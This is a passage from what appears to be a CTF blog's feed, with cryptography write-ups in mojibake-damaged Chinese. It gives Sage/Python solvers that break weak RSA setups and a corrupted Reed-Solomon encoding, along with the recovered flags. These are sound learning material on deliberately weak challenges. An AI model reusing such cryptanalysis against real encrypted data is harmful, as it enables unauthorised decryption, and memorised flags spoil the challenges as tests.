class="number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span></span><br><span class="line">PQQ = <span class="number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span></span><br><span class="line">t = <span class="number">44</span></span><br><span class="line">c = <span class="number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">PQ = gcd(PPQ,PQQ)</span><br><span class="line">P = PPQ//PQ</span><br><span class="line">Q = PQQ//PQ</span><br><span class="line"><span class="built_in">print</span>(P)</span><br><span class="line"><span class="built_in">print</span>(Q)</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ,[[<span class="number">1</span>,P],[<span class="number">0</span>,Q]])</span><br><span class="line">x = A.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = -x+<span class="number">58</span></span><br><span class="line">q = (t-P*(p-<span class="number">58</span>))%Q</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;8f3djoj9wedj2_dkc903cwckckdk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="EasyRsa"><a href="#EasyRsa" class="headerlink" title="EasyRsa"></a>EasyRsa</h3><blockquote><p>really easy rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    m = c</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = %s&#x27;</span> % (m)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>gcdæµ‹è¯•å‘ç°outputä¸­çš„ $n$ æœ‰ç´ å…¬å› å­ $p$ï¼Œé€†æ¨è¿˜åŸ $m$ å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n = [<span class="number">65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619</span>,<span class="number">86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499</span>,<span class="number">57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547</span>,<span class="number">52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269</span>,<span class="number">79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243</span>,<span class="number">73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879</span>,<span class="number">89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763</span>,<span class="number">66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643</span>,<span class="number">79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213</span>,<span class="number">70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189</span>,<span class="number">51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663</span>,<span class="number">87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897</span></span><br><span class="line">c = <span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    q = <span class="built_in">int</span>(n[i]//p)</span><br><span class="line">    f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = inverse_mod(e,f)</span><br><span class="line">    c = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n[i]))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;GWHT&#123;gixkJl7SJTcpLOL9zqwo&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Solomenâ€™s-puzzle-1"><a href="#Solomenâ€™s-puzzle-1" class="headerlink" title="Solomenâ€™s puzzle 1"></a>Solomenâ€™s puzzle 1</h3><blockquote><p>F1oweråšæ¢¦æ¢¦è§äº†Reedå’ŒSolomenï¼Œä»–ä»¬å‘Šè¯‰äº†F1owerè´¢å¯Œå¯†ç ï¼Œä½†æ˜¯F1owerè®°é”™äº†å‡ ä¸ªå­—èŠ‚ã€‚ã€‚è¯·å°†æœ€ç»ˆå¾—åˆ°çš„å®Œæ•´flag(åŒ…å«DASCTF{})è¿›è¡ŒMD5åå†æäº¤ï¼Œå³æäº¤ï¼š<code>&quot;DASCTF&#123;%s&#125;&quot; % md5(flag.encode()).hexdigest()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># type: ignore</span></span><br><span class="line"></span><br><span class="line">m = <span class="number">257</span></span><br><span class="line">F = Zmod(m)</span><br><span class="line">alpha = F(<span class="number">223</span>)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(F)</span><br><span class="line">gx = (x - alpha ^ <span class="number">0</span>) * (x - alpha ^ <span class="number">1</span>) * (x - alpha ^ <span class="number">2</span>) * (x - alpha ^ <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_block</span>(<span class="params">message</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(message, <span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">    f = PR([<span class="number">0</span>] * <span class="number">4</span> + message)</span><br><span class="line">    px = f % gx</span><br><span class="line">    mx = f - px</span><br><span class="line">    c = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> mx]</span><br><span class="line">    <span class="keyword">return</span> c + (<span class="number">8</span> - <span class="built_in">len</span>(c)) * [<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">byte_stream</span>):</span></span><br><span class="line"></span><br><span class="line">    length = <span class="built_in">len</span>(byte_stream)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        padding = (length // <span class="number">4</span> + <span class="number">1</span>) * <span class="number">4</span> - length</span><br><span class="line">        byte_stream += padding * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        length += padding</span><br><span class="line">    code = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, <span class="number">4</span>):</span><br><span class="line">        block = byte_stream[i:i+<span class="number">4</span>]</span><br><span class="line">        block_code = encode_block([each <span class="keyword">for</span> each <span class="keyword">in</span> block])</span><br><span class="line">        code += <span class="built_in">bytes</span>(block_code)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, p, q</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">10632528934906371807995216845027219767890923967559690651733628659750564299493611010425615580946665632019547006685100876646048602773295571936276450835367591</span></span><br><span class="line"></span><br><span class="line">cipher = bytes_to_long(flag) * e % n</span><br><span class="line">code = encode(long_to_bytes(cipher))</span><br><span class="line"></span><br><span class="line">code = [each <span class="keyword">for</span> each <span class="keyword">in</span> code]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>, <span class="number">8</span>):</span><br><span class="line">    index1 = randrange(<span class="number">4</span>, <span class="number">8</span>)</span><br><span class="line">    value1 = randrange(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">    index2 = randrange(<span class="number">4</span>, <span class="number">8</span>)</span><br><span class="line">    value2 = randrange(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">    code[i + index1] = value1</span><br><span class="line">    code[i + index2] = value2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(code))</span><br></pre></td></tr></table></figure></blockquote><p>å°† $m$ é€šè¿‡ $me\%n$ è®¡ç®—å¾— $c$ï¼Œå†æŒ‰4é•¿åº¦åˆ†å—é€šè¿‡ <code>encode_block()</code> åŠ å¯†å¾—åˆ°å¯†æ–‡ï¼Œæ¯å—å¯†æ–‡é•¿åº¦ä¸º8ï¼Œå‰4é•¿åº¦ä¸ºå¯†æ–‡å€¼ï¼Œå4é•¿åº¦ä¸ºåŠ å¯†å‰å€¼ï¼Œå†å°†å4é•¿åº¦åŠ å¯†å‰å€¼çš„ä¸€æˆ–äºŒä½å†…å®¹éšæœºè®¾ç½®ä¸ºéšæœºå€¼ã€‚</p><p>æå–å…³é”®åŠ å¯†å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="number">257</span></span><br><span class="line">F = Zmod(m)</span><br><span class="line">alpha = F(<span class="number">223</span>)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(F)</span><br><span class="line">gx = (x - alpha ^ <span class="number">0</span>) * (x - alpha ^ <span class="number">1</span>) * (x - alpha ^ <span class="number">2</span>) * (x - alpha ^ <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_block</span>(<span class="params">message</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(message, <span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">    f = PR([<span class="number">0</span>] * <span class="number">4</span> + message)</span><br><span class="line">    px = f % gx</span><br><span class="line">    mx = f - px</span><br><span class="line">    c = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> mx]</span><br><span class="line">    <span class="keyword">return</span> c + (<span class="number">8</span> - <span class="built_in">len</span>(c)) * [<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>å¤šé¡¹å¼è¿ç®— $px=f\%gx$ï¼Œ$mx=f-px$ï¼Œæ•… $f$ ä¸ $mx$ æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå¯ç”± $mx$ æ¢å¤åŸ $f$ã€‚</p><p>åˆ©ç”¨sageå¤šé¡¹å¼è®¡ç®—åŠŸèƒ½ï¼Œå¯ä»¥æ¨å¯¼ $f$ ä¸ $mx$ å…³ç³»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#m = 257</span></span><br><span class="line"><span class="comment">#F = Zmod(m)</span></span><br><span class="line">alpha = <span class="number">223</span></span><br><span class="line">PR.&lt;x,a,b,c,d&gt; = PolynomialRing(Zmod(<span class="number">257</span>))</span><br><span class="line">gx = (x - alpha ^ <span class="number">0</span>) * (x - alpha ^ <span class="number">1</span>) * (x - alpha ^ <span class="number">2</span>) * (x - alpha ^ <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">f = d*x^<span class="number">7</span> + c*x^<span class="number">6</span> + b*x^<span class="number">5</span> + a*x^<span class="number">4</span></span><br><span class="line">px = f % gx</span><br><span class="line">mx = f - px</span><br><span class="line"><span class="built_in">print</span>(mx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># x^7*d + x^6*c + x^5*b + x^4*a + 145*x^3*a + 233*x^3*b + 82*x^3*c + 73*x^3*d + 184*x^2*a + 200*x^2*b + 141*x^2*c + 111*x^2*d + 152*x*a + 94*x*b + 36*x*c + 126*x*d + 32*a + 243*b + 254*c + 203*d</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®å¯¹åº”å…³ç³»ï¼Œåˆ©ç”¨GrÃ¶bneråŸºæ±‚è§£å››å…ƒæ¨¡æ–¹ç¨‹ç»„ï¼Œå†åˆ†ç»„è¿˜åŸå4é•¿åº¦ä¸ºåŠ å¯†å‰å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">m = <span class="number">257</span></span><br><span class="line">F = Zmod(m)</span><br><span class="line">alpha = <span class="number">223</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(F)</span><br><span class="line">gx = (x - alpha ^ <span class="number">0</span>) * (x - alpha ^ <span class="number">1</span>) * (x - alpha ^ <span class="number">2</span>) * (x - alpha ^ <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calLast</span>(<span class="params">v</span>):</span></span><br><span class="line">    P.&lt;a,b,c,d&gt; = PolynomialRing(Zmod(<span class="number">257</span>))</span><br><span class="line">    f0 = <span class="number">32</span>*a + <span class="number">243</span>*b + <span class="number">254</span>*c + <span class="number">203</span>*d - v[<span class="number">0</span>]</span><br><span class="line">    f1 = <span class="number">152</span>*a + <span class="number">94</span>*b + <span class="number">36</span>*c + <span class="number">126</span>*d - v[<span class="number">1</span>]</span><br><span class="line">    f2 = <span class="number">184</span>*a + <span class="number">200</span>*b + <span class="number">141</span>*c + <span class="number">111</span>*d - v[<span class="number">2</span>]</span><br><span class="line">    f3 = <span class="number">145</span>*a + <span class="number">233</span>*b + <span class="number">82</span>*c + <span class="number">73</span>*d - v[<span class="number">3</span>]</span><br><span class="line">    G = Ideal([f0, f1, f2, f3]).groebner_basis()</span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> G:</span><br><span class="line">        mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        m.append(mi)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">e = <span class="number">10632528934906371807995216845027219767890923967559690651733628659750564299493611010425615580946665632019547006685100876646048602773295571936276450835367591</span></span><br><span class="line">n = <span class="number">94257413713770111563970534929325680923943690882102478219183863722026590313165304301118258536360712467357451726680293716779730218553691126214750969333228034756948476572806064756873382054384808713137658321644158757777088916851366208046581218865015163572359836440643828462291397248680038931998325006839692797347</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">b&#x27;\xb9$5.&gt;\xff\xe3S\xc91\xb2\xeb\x1byR(\x12&#123;\xc4\xbf\xa4wo|\xc5-;\xc9\xc9S[\xaeX\xad\xf0\xef@\x1c\x87]\x9a\xb9:\x8cu\xa5\xe3EA&lt;&quot;\xfd\x9a\xbfqB\x94\xc3R\x95\xd5\xbd\xd0\x10u\x10\xe3\xa5&quot;S\xed\xd0\xf8\x02\xbf\x124A~1]\xceP\xdf\xf2Cr1\x93\xacw\x03\tQe\xcc2b\xbf\x0f\x92\xad\x19\x00\xab|\xf3\xc9\x9b&amp;I%\xf5\x9b#\xf7\xa2\xcb\xb1\x0c\xee\xb56\xd5\xd2\xd5[?^\x9d\x8b\x93\xbe\x832\xee\xa9\xa5\x83$\xe9\xe5\x95\x01\xd6\x9f\xad\x1f\x90\xc3]aL\x10\x07&#123;#4i^\xae\xdf|\x9f\x94\xf4\xaf\x06R\x86j&amp;\xeb\x0b\x06\xcf\xb2\x8e\xb4\xb9s\x97[\xf1ip\x06\xf8\xfdFs\xf1`\xc6\x82\xd8\xce\xf6\x95&#123;\xe3\x8cQ\xed\xef\xe9\xb9\&#x27;\x19\xdf^\xc8\x81\xde\x1fQ\x1e\x86\xda\xf8\xfd4M0#\xef\x8a\xe9\xe5\xfc\xe2\xe3\xe6\xd0e\xce\xe1\x0b\x9eM\x07\xc2Y\xf8B\xe1\xde\xfaP\xe9\x9d\xde\xc3\xe3C\xa5&#x27;</span>)</span><br><span class="line">ori_c = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">8</span>):</span><br><span class="line">    block = c[i:i+<span class="number">8</span>]</span><br><span class="line">    ori_c += calLast(c[i:i+<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">bytes</span>(ori_c).<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">bytes</span>(ori_c).<span class="built_in">hex</span>(),<span class="number">16</span>)*inverse_mod(e,n)%n</span><br><span class="line">flag = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;DASCTF&#123;%s&#125;&quot;</span> % md5(flag).hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># DASCTF&#123;4e4fc02d88b0c8f66c924489e1bf58ea&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;å¤§èµ›ç”±ä¸­å…±å¹¿å·å¸‚å§”ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–å§”å‘˜ä¼šåŠå…¬å®¤ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¹¿å·å¸‚ç½‘ç»œå®‰å…¨äº§ä¸šä¿ƒè¿›ä¼šä¸»åŠï¼Œå¹¿ä¸œå¤–è¯­å¤–è´¸å¤§å­¦ã€æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸æ‰¿åŠï¼Œå¹¿å·å¸‚ä¿¡æ¯å®‰å…¨æµ‹è¯„ä¸­å¿ƒã€å¹¿å·äº’è”ç½‘åä¼šååŠã€‚&lt;/p&gt;
&lt;p&gt;å¤§èµ›ä»¥â€œç½‘ç»œå®‰å…¨ä¸ºäººæ°‘ã€ç½‘ç»œå®‰å…¨é äººæ°‘â€ä¸ºä¸»é¢˜</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF 2022</title>
    <link href="https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/"/>
    <id>https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/</id>
    <published>2022-07-17T13:18:30.000Z</published>
    <updated>2022-07-17T16:14:32.991Z</updated>
    
